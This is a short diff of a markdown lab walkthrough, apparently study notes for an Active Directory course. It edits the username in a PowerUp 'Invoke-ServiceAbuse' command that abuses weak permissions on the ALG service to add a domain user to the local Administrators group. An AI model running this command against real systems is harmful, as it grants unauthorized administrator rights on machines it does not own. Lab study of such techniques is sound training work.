@@ -19,7 +19,7 @@ Invoke-AllChecks
 Let’s use the abuse function for the service permission issue and add our current domain user to the local Administrators group.
 
 ```
-Invoke-ServiceAbuse -Name ALG -UserName us\studentuserx - Verbose
+Invoke-ServiceAbuse -Name ALG -UserName us\studentuser139 - Verbose
 ```
 
 ![[Pasted image 20250313213101.png]]
